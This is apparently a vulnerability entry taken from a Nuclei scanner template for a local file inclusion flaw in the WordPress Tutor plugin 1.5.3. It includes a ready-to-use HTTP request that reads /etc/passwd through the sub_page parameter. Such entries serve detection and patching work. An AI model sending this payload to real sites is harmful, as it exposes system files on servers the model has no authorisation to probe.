# Vulnerability: WordPress tutor 1.5.3 - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`wp-tutor-lfi.yaml`)

## Description
WordPress tutor.1.5.3 is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/tutor/views/pages/instructors.php?sub_page=/etc/passwd
```

